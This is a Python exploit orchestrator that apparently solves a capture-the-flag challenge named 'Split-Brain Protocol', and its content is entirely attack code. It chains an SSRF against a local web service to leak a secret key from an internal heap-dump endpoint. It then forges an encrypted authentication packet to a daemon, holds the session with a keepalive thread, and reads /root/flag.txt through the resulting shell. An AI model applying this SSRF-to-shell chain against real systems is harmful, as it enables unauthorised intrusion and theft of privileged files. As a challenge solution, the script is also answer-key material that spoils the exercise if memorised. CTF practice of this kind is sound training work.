#!/usr/bin/env python3
"""
Full End-to-End Duo Exploit Orchestrator for CTF 6: Split-Brain Protocol
Demonstrates:
  1. SSRF bypass against Port 8000 -> leaks 32-byte session key
  2. Assembles Feistel-encrypted packet with magic SPLT
  3. Sends packet to Port 9000 daemon
  4. Concurrent keepalive worker maintains 15s heartbeat
  5. Shell captures /root/flag.txt
"""

import sys
import time
import socket
import threading
import requests
from solve_crypto import assemble_packet

WEB_URL = "http://localhost:8000"
DAEMON_HOST = "localhost"
DAEMON_PORT = 9000

def player1_web_ssrf():
    print("[Player 1] Triggering Blind SSRF to extract memory secret...")
    payload = {"template_url": "http://0.0.0.0:8000/api/internal/debug/dump-heap"}
    r = requests.post(f"{WEB_URL}/api/v1/invoice/render", json=payload)
    data = r.json()
    secret = data.get("internal_debug_leak", {}).get("ephemeral_secret_key")
    print(f"[Player 1] Extracted Secret Key: {secret}")
    return secret

def player1_keepalive_worker(stop_event):
    print("[Player 1] Keepalive thread active. Sending /api/v1/keepalive every 8s...")
    while not stop_event.is_set():
        try:
            requests.post(f"{WEB_URL}/api/v1/keepalive", json={})
        except Exception:
            pass
        time.sleep(8)

def player2_daemon_exploit(secret):
    print("[Player 2] Crafting binary authentication packet with Feistel cipher...")
    pkt = assemble_packet(secret)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((DAEMON_HOST, DAEMON_PORT))
    s.sendall(pkt)

    banner = s.recv(1024).decode(errors='ignore')
    print(f"[Player 2] Daemon Response:\n{banner}")

    stop_keepalive = threading.Event()
    t = threading.Thread(target=player1_keepalive_worker, args=(stop_keepalive,))
    t.daemon = True
    t.start()

    time.sleep(1)
    s.sendall(b"cat /root/flag.txt\n")
    flag = s.recv(1024).decode(errors='ignore')
    print(f"\n[✓] ROOT FLAG CAPTURED:\n{flag}\n")

    stop_keepalive.set()
    s.close()

if __name__ == "__main__":
    session_key = player1_web_ssrf()
    if session_key:
        player2_daemon_exploit(session_key)
